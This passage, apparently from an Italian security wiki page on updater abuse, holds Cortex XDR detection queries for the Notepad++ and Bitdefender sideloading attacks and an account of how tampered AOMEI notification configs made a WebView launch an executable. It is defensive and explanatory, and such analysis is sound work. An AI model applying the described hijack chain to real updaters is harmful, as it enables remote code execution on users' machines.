| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> avvia un programma di installazione diverso da quello di Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Questi pattern si applicano a qualsiasi updater che accetti manifest non firmati o non verifichi i signer degli installer: hijack della rete + installer malevolo + sideloading firmato con un certificato controllato dall’attaccante portano all’esecuzione di codice remoto sotto la copertura di aggiornamenti “attendibili”.

### La configurazione delle notifiche come secondo trigger di aggiornamento

Un updater può usare configurazioni remote separate per **preparare i contenuti e avviarne l’esecuzione**. Ciò richiede il controllo delle configurazioni o delle relative risposte; i report non specificano come sia stato ottenuto l’accesso all’origine. Nel caso AOMEI, `down_html.ini` selezionava un URL per l’archivio, la versione (`thrid`) e l’MD5 (`Val`); l’attaccante ha aumentato la versione e modificato insieme l’URL e il checksum corrispondente. Questo è il [metadata trust-boundary failure](#2-hijacking-the-update-channel-to-run-code-as-system) descritto sopra. Il percorso di esecuzione aggiuntivo usava `Notifycfg.ini`: indicava ad `ABNotify.exe` di caricare `upgrade-now.html`, estratto in precedenza, tramite un URL locale `file:///` in una WebView. La pagina navigava automaticamente a un eseguibile presente nella stessa cartella, che la WebView passava alla shell di sistema. Il processo figlio ereditava i privilegi del notifier; ciò non lo elevava automaticamente a SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google ha inoltre segnalato un `Notifycfg.ini` manomesso con oltre 35.000 sezioni dummy ripetute, che ha aggirato il normale controllo della versione del client. Il report non dimostra un bypass generale del parser. L’attaccante ripristinava i file remoti dopo finestre di cinque-dieci minuti, quindi solo i client che eseguivano il polling in quei momenti ricevevano la configurazione modificata. Questo canale di notifica veicolava anche un distinto [adescamento WebDAV/NTLM per forzare l’autenticazione](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion), che non richiedeva l’esecuzione dell’archivio.<sup>[[18]](#references)</sup>

---
## References
- [1] [Avviso – Netskope Client per Windows – Escalation dei privilegi locali tramite server rogue (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Avviso di sicurezza Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – client/exploit IPC di Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Compromissione di ASUS DriverHub, MSI Center, Acer Control Centre e Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Escalation dei privilegi locali tramite file scrivibili in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Escalation dei privilegi nell’agent Windows](https://checkmk.com/werk/16361)
- [10] [PoC di sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer di CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Attori statali sfruttano la supply chain di Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – aggiornamento sull’incidente di hijack dell’infrastruttura](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypass della correzione per CVE-2025-0309 in Netskope Client per Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Individuazione di vulnerabilità di escalation dei privilegi in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: da gRPC a SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Compromissione della supply chain di AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group e Mandiant – Indagine sulla manomissione effimera della supply chain](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
